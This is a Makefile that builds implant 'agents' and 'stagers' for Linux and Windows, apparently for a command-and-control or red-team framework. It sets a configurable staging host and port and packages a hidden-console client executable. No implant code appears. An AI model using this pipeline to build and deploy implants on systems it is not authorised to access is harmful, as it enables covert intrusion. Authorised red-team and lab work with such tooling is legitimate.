CC_LINUX    ?= gcc
CC_WIN      ?= x86_64-w64-mingw32-gcc
CFLAGS      ?= -O2 -s
PYINSTALLER ?= pyinstaller
WINE        ?= wine
C_DIR       := c-implant
STAGE_HOST  ?= 127.0.0.1
STAGE_PORT  ?= 8080

.PHONY: all agent-linux agent-windows stager-linux stager-windows \
        pyinstaller pyinstaller-windows clean test lint payloads

all: agent-linux agent-windows stager-linux stager-windows

agent-linux:
	$(CC_LINUX) $(CFLAGS) -o $(C_DIR)/agent_linux $(C_DIR)/agent.c -lpthread
	@echo "[+] Linux agent: $(C_DIR)/agent_linux"

agent-windows:
	@command -v $(CC_WIN) >/dev/null 2>&1 && { \
		$(CC_WIN) $(CFLAGS) -o $(C_DIR)/agent.exe $(C_DIR)/agent.c -lws2_32; \
		echo "[+] Windows agent: $(C_DIR)/agent.exe"; } \
		|| echo "[!] $(CC_WIN) not found — install mingw-w64"

stager-linux:
	$(CC_LINUX) $(CFLAGS) -o $(C_DIR)/stager_linux $(C_DIR)/stager.c \
		-DSTAGE_HOST='"$(STAGE_HOST)"' -DSTAGE_PORT=$(STAGE_PORT) -lpthread
	@echo "[+] Linux stager: $(C_DIR)/stager_linux"

stager-windows:
	@command -v $(CC_WIN) >/dev/null 2>&1 && { \
		$(CC_WIN) $(CFLAGS) -o $(C_DIR)/stager.exe $(C_DIR)/stager.c \
			-DSTAGE_HOST='"$(STAGE_HOST)"' -DSTAGE_PORT=$(STAGE_PORT) -lws2_32; \
		echo "[+] Windows stager: $(C_DIR)/stager.exe"; } \
		|| echo "[!] $(CC_WIN) not found — install mingw-w64"

pyinstaller:
	$(PYINSTALLER) --onefile --noconsole --distpath dist client/client.py
	@echo "[+] PyInstaller agent: dist/client"

pyinstaller-windows:
	@command -v $(WINE) >/dev/null 2>&1 && { \
		$(WINE) $(PYINSTALLER) --onefile --noconsole --distpath dist client/client.py; \
		echo "[+] Windows .exe: dist/client.exe"; } \
		|| echo "[!] wine not found — install wine"

clean:
	rm -rf dist/ build/ *.spec $(C_DIR)/agent_linux $(C_DIR)/agent.exe \
	       $(C_DIR)/stager_linux $(C_DIR)/stager.exe __pycache__/ .pytest_cache/

test:
	python3 -m pytest tests/ -v

lint:
	ruff check . --fix

payloads:
	python3 cli.py generate-payloads
